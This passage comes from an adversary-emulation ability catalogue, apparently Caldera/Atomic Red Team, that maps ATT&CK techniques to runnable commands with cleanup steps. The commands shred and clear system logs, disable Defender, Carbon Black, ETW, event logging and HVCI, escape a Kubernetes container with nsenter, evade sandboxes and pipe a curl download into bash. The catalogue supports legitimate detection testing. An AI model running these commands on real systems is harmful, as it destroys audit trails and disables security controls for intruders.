["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo cat /dev/null > /var/log/system.log; sudo cat /dev/zero > /var/lol/system.log", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs", "ability_id": "e6db40aa05312412b84b482ed2bad92d", "technique_id": "T1070.002", "tactic": "defense-evasion", "requirements": [], "name": "Delete log files via cat utility by appending /dev/null or /dev/zero", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Remove a downloaded payload file", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm #{payload}"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": null, "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm #{payload}"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": null, "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["Remove-Item -Force -Path \"#{payload}\""], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": null, "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["Remove-Item -Force -Path \"#{payload}\""], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": null, "language": null, "name": "pwsh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: File Deletion", "ability_id": "4cd4eb44-29a7-4259-91ae-e457b283a880", "technique_id": "T1070.004", "tactic": "defense-evasion", "requirements": [], "name": "Delete payload", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The first sub-test deletes the journal files using rm utility in the \"/var/log/journal/\" directory and the second sub-test clears the journal by modifiying time period of logs that should be retained to zero.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sudo rm /var/log/journal/*; sudo journalctl --vacuum-time=0", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs", "ability_id": "dfe7d14833fd57a8e8e48019e063b0a7", "technique_id": "T1070.002", "tactic": "defense-evasion", "requirements": [], "name": "Delete system journal logs via rm and journalctl utilities", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test deletes the system log file using applescript using osascript via Finder application\nNote: The user may be prompted to grant access to the Finder application before the command can be executed successfully as part of TCC(Transparency, Consent, and Control) Framework.\nRefer: https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "osascript -e 'tell application \"Finder\" to delete POSIX file \"/var/log/system.log\"'", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs", "ability_id": "6269167cf683e0a2062696a4b038217f", "technique_id": "T1070.002", "tactic": "defense-evasion", "requirements": [], "name": "Delete system log files using Applescript", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test deletes the system log file using osascript via \"do shell script\"(sh/bash by default) which in-turn spawns rm utility, requires admin privileges\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "osascript -e 'do shell script \"rm /var/log/system.log\" with administrator privileges'", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs", "ability_id": "ec078c0f9c10dc9fddd3fee713750137", "technique_id": "T1070.002", "tactic": "defense-evasion", "requirements": [], "name": "Delete system log files using OSAScript", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test overwrites the contents of the log file with zero bytes(-z) using three passes(-n 3) of data, and then delete the file(-u) securely\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo shred -u -z -n 3 /var/log/system.log", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs", "ability_id": "1a11245acd65695bbb3d7c4920337a6c", "technique_id": "T1070.002", "tactic": "defense-evasion", "requirements": [], "name": "Delete system log files using shred utility", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test securely deletes the system log files individually and recursively using the srm utility.\nInstall srm using Homebrew with the command: brew install khell/homebrew-srm/srm\nRefer: https://github.com/khell/homebrew-srm/issues/1 for installation\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo srm /var/log/system.log; sudo srm -r /var/log/", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs", "ability_id": "1a48502ebf2881017284650f0efec2ba", "technique_id": "T1070.002", "tactic": "defense-evasion", "requirements": [], "name": "Delete system log files using srm utility", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test deletes the system log file using unlink utility\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo unlink /var/log/system.log", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs", "ability_id": "dbf9c5b79204dfba72c1c55c3b32f63c", "technique_id": "T1070.002", "tactic": "defense-evasion", "requirements": [], "name": "Delete system log files via unlink utility", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Encode/Decode executable\nUpon execution a file named T1140_calc_decoded.exe will be placed in the temp folder\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del %temp%\\T1140_calc.txt >nul 2>&1 && del %temp%\\T1140_calc_decoded.exe >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "certutil -encode C:\\Windows\\System32\\calc.exe %temp%\\T1140_calc.txt && certutil -decode %temp%\\T1140_calc.txt %temp%\\T1140_calc_decoded.exe", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Deobfuscate/Decode Files or Information", "ability_id": "26c0843592bd870dab849c9f682b09da", "technique_id": "T1140", "tactic": "defense-evasion", "requirements": [], "name": "Deobfuscate/Decode Files Or Information", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime. They can do this using docker create and docker start commands. Kinsing & Doki was exploited using this technique. \n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["docker stop t1610_container; docker rmi -f t1610:latest"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "docker build -t t1610 $PathtoAtomicsFolder/T1610/src/; docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Deploy a container", "ability_id": "c718b1860b3b1689beda518f39b4e90a", "technique_id": "T1610", "tactic": "multiple", "requirements": [], "name": "Deploy Docker container", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "In this escape `kubectl` is used to launch a new pod, with a container that has the host pids mapped into the container (`hostPID:true`). It uses the alpine linux container image. It runs with privilege on the host (`privileged:true`). When the container is launched the command `nsenter --mount=/proc/1/ns/mnt -- /bin/bash` is ran. Since the host processes have been mapped into the container, the container enters the host namespace, escaping the container.\n\nAdditional Details:\n- https://twitter.com/mauilion/status/1129468485480751104\n- https://securekubernetes.com/scenario_2_attack/\n", "repeatable": false, "privilege": "", "buckets": ["privilege-escalation"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["kubectl --context kind-atomic-cluster delete pod atomic-escape-pod"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{\"spec\":{\"hostPID\": true, \"containers\":[{\"name\":\"1\",\"image\":\"alpine\",\"command\":[\"nsenter\",\"--mount=/proc/1/ns/mnt\",\"--\",\"/bin/bash\"],\"stdin\": true,\"tty\":true,\"securityContext\":{\"privileged\":true}}]}}'", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Escape to Host", "ability_id": "d55b419a683d8b328f8f8d01dfc08148", "technique_id": "T1611", "tactic": "privilege-escalation", "requirements": [], "name": "Deploy container using nsenter container escape", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "systemd-detect-virt detects execution in a virtualized environment.\nAt boot, dmesg stores a log if a hypervisor is detected.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.acrn", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "virtualization.info"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if (systemd-detect-virt) then echo \"Virtualization Environment detected\"; fi; if (sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo \"Virtualization Environment detected\"; fi;", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Virtualization/Sandbox Evasion: System Checks", "ability_id": "2d5466e4b31c7db0860642bce47ef5ca", "technique_id": "T1497.001", "tactic": "multiple", "requirements": [], "name": "Detect Virtualization Environment (Linux)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "ioreg contains registry entries for all the device drivers in the system. If it's a virtual machine, one of the device manufacturer will be a Virtualization Software.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "if (ioreg -l | grep -e Manufacturer -e 'Vendor Name' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo 'Virtualization Environment detected'; fi;", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Virtualization/Sandbox Evasion: System Checks", "ability_id": "4fc7ed6101b8c04379734b0e4261902d", "technique_id": "T1497.001", "tactic": "multiple", "requirements": [], "name": "Detect Virtualization Environment (MacOS)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Windows Management Instrumentation(WMI) objects contains system information which helps to detect virtualization. This command will specifically attempt to get the CurrentTemperature value from this object and will check to see if the attempt results in an error that contains the word supported. This is meant to find the result of Not supported, which is the result if run in a virtual machine\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$error.clear()"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$error.clear(); Get-WmiObject -Query \"SELECT * FROM MSAcpi_ThermalZoneTemperature\" -ErrorAction SilentlyContinue; if($error) {echo \"Virtualization Environment detected\"}", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Virtualization/Sandbox Evasion: System Checks", "ability_id": "e9e69b4fedb8e40d634865ce9a3192dc", "technique_id": "T1497.001", "tactic": "multiple", "requirements": [], "name": "Detect Virtualization Environment (Windows)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Windows Management Instrumentation(WMI) objects contain system information which helps to detect virtualization. This test will get the model and manufacturer of the machine to determine if it is a virtual machine, such as through VMware or VirtualBox. \n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \"Manufacturer\"; $Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \"Model\"; if((($Manufacturer.ToLower() -eq \"microsoft corporation\") -and ($Model.ToLower().contains(\"virtual\"))) -or ($Manufacturer.ToLower().contains(\"vmware\")) -or ($Model.ToLower() -eq \"virtualbox\")) {write-host \"Virtualization environment detected!\"} else {write-host \"No virtualization environment detected!\"}", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Virtualization/Sandbox Evasion: System Checks", "ability_id": "64ccf7cd4358a0540ab51c8015c1b744", "technique_id": "T1497.001", "tactic": "multiple", "requirements": [], "name": "Detect Virtualization Environment via WMI Manufacturer/Model Listing (Windows)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may develop a useful utility or subvert the CI/CD pipe line of a legitimate utility developer, who requires or suggests installing their utility by piping a curl download directly into bash. Of-course this is a very bad idea. The adversary may also take advantage of this BLIND install method and selectively running extra commands in the install script for those who DO pipe to bash and not for those who DO NOT. This test uses curl to download the pipe-to-shell.sh script, the first time without piping it to bash and the second piping it into bash which executes the echo command.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/art.txt"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh; ls -la /tmp/art.txt; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh |bash; ls -la /tmp/art.txt", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: Bash", "ability_id": "e7d5344c67f15cfd82d74af6caabfcf0", "technique_id": "T1059.004", "tactic": "execution", "requirements": [], "name": "Detecting pipe-to-shell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Disables ETW for the .NET Framework using the reg.exe utility to update the Windows registry", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["REG DELETE HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /f > nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "REG ADD HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /t REG_DWORD /d 0", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Indicator Blocking", "ability_id": "21a279cb142da9bc65cd4a19bef7a2d2", "technique_id": "T1562.006", "tactic": "defense-evasion", "requirements": [], "name": "Disable .NET Event Tracing for Windows Via Registry (cmd)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Disables ETW for the .NET Framework using PowerShell to update the Windows registry", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["REG DELETE HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /f > $null 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-ItemProperty -Path HKLM:\\Software\\Microsoft\\.NETFramework -Name ETWEnabled -Value 0 -PropertyType \"DWord\" -Force", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Indicator Blocking", "ability_id": "8beb34c915b17873e357c030d517be0a", "technique_id": "T1562.006", "tactic": "defense-evasion", "requirements": [], "name": "Disable .NET Event Tracing for Windows Via Registry (powershell)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Administrative shares are hidden network shares created by Microsoft\u2019s Windows NT operating systems that grant system administrators \nremote access to every disk volume on a network-connected system. These shares are automatically created at started unless they have been\npurposefully disabled as is done in this Atomic test. As Microsoft puts it, \"Missing administrative shares typically \nindicate that the computer in question has been compromised by malicious software.\"\nhttps://threatpost.com/conti-ransomware-gang-has-full-log4shell-attack-chain/177173/\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareServer /f && reg delete \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareWks /f"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareServer /t REG_DWORD /d 0 /f && reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareWks /t REG_DWORD /d 0 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Network Share Connection Removal", "ability_id": "fa93e59e1418d91ce03418913ca80fa7", "technique_id": "T1070.005", "tactic": "defense-evasion", "requirements": [], "name": "Disable Administrative Share Creation at Startup", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "With administrative rights, an adversary can disable Windows Services related to security products. This test requires McAfeeDLPAgentService to be installed.\nChange the service_name input argument for your AV solution. Upon exeuction, infomration will be displayed stating the status of the service.\nTo verify that the service has stopped, run \"sc query McAfeeDLPAgentService\"\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sc.exe config McAfeeDLPAgentService start= auto >nul 2>&1 && net.exe start McAfeeDLPAgentService >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net.exe stop McAfeeDLPAgentService && sc.exe config McAfeeDLPAgentService start= disabled", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "8b71e899ab6e719d4ce6e0f7c9ac85ca", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Disable Arbitrary Security Windows Service", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Keeps history clear and stays out of lastlog,wtmp,btmp ssh -T keeps the ssh client from catching a proper TTY, which is what usually gets logged on lastlog\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["userdel -f testuser1"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Command History", "ability_id": "50fa843f5f6995bbc50ee3c45ec480a2", "technique_id": "T1070.003", "tactic": "defense-evasion", "requirements": [], "name": "Disable Bash History Logging with SSH -T", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Disables Carbon Black Response\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.daemon.plist; sudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist; sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "ac8b270b934f97529a09688fe944b347", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Disable Carbon Black Response", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Disable the Cb Response service\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ]; then   service cbdaemon stop;   chkconfig off cbdaemon; else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];   systemctl stop cbdaemon;   systemctl disable cbdaemon; fi", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "26bd72e1fe309c1cf45fa9a36de63fcd", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Disable Cb Response", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Information on NirSoft AdvancedRun and its creators found here: http://www.nirsoft.net/utils/advanced_run.html\nThis Atomic will run AdvancedRun.exe with similar behavior identified during the WhisperGate campaign.\nSee https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3\nUpon successful execution, AdvancedRun.exe will attempt to run and stop Defender, and optionally attempt to delete the Defender folder on disk. \n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Try {cmd /c $env:temp\\AdvancedRun.exe /EXEFilename \"$env:systemroot\\System32\\sc.exe\" /WindowState 0 /CommandLine \"start WinDefend\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Try {cmd /c $env:temp\\AdvancedRun.exe /EXEFilename \"$env:systemroot\\System32\\sc.exe\" /WindowState 0 /CommandLine \"stop WinDefend\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}; if(0){;   $CommandToRun = rmdir \"$env:programdata\\Microsoft\\Windows Defender\" -Recurse;   Try {cmd /c $env:temp\\AdvancedRun.exe /EXEFilename \"$env:systemroot\\System32\\WindowsPowershell\\v1.0\\powershell.exe\" /WindowState 0 /CommandLine \"$CommandToRun\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}; }", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "4166b6cb546ee537c916c1f864f1294b", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Disable Defender Using NirSoft AdvancedRun", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Attempting to use Defender Control software to disable Windows Defender. Upon successful execution, Windows Defender will be turned off. \n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["cmd /c $env:temp\\DefenderControl\\DefenderControl\\DefenderControl.exe /E | Out-Null"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cmd /c $env:temp\\DefenderControl\\DefenderControl\\DefenderControl.exe /D FFFF | Out-Null", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "be62caa4ce347cdfc7122ada8ca9d513", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Disable Defender with Defender Control", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Wevtutil can be used to disable logs. \nNOTE: RansomEXX ransomware uses this to disable Security logs post-encryption.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["wevtutil sl \"Microsoft-Windows-IKE/Operational\" /e:true"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "wevtutil sl \"Microsoft-Windows-IKE/Operational\" /e:false", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable Windows Event Logging", "ability_id": "7b7c4e56566e5c917c5e0bbaaef4f1c5", "technique_id": "T1562.002", "tactic": "defense-evasion", "requirements": [], "name": "Disable Event Logging with wevtutil", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test disables Hypervisor-Enforced Code Integrity (HVCI) by setting the registry key HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity \"Enabled\" value to \"0\".\nThe pre-req needs to be ran in order to setup HVCI and have it enabled. \nWe do not recommend running this in production.\n[Black Lotus Campaign](https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/)\n[Microsoft](https://learn.microsoft.com/en-us/windows/security/threat-protection/device-guard/enable-virtualization-based-protection-of-code-integrity)\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"EnableVirtualizationBasedSecurity\" /f; reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"RequirePlatformSecurityFeatures\" /f; reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"Locked\" /f; reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" /f; reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Locked\" /f"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" /t REG_DWORD /d 0 /f", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "b97004a5d9c4283b6085ddf3ff0d6b4c", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Disable Hypervisor-Enforced Code Integrity (HVCI)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Disables LittleSnitch\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sudo launchctl load -w /Library/LaunchDaemons/at.obdev.littlesnitchd.plist"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "87820d29cb755efb41e0b9543ab0f649", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Disable LittleSnitch", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "disable swapping of device paging that impaire the compromised host to swap data if the RAM is full. Awfulshred wiper used this technique as an additional \npayload to the compromised host and to make sure that there will be no recoverable data due to swap feature of linux.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["swapon -a; sleep 2; sync"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "swapon -a ; sleep 2; swapoff -a; sync", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "68158bd952ed22af53a8dbfae9647839", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Disable Memory Swap", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Disables the Microsoft Defender Firewall for the current profile.\nCaution if you access remotely the host where the test runs! Especially with the cleanup command which will re-enable firewall for the current profile...\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["netsh advfirewall set currentprofile state on >nul 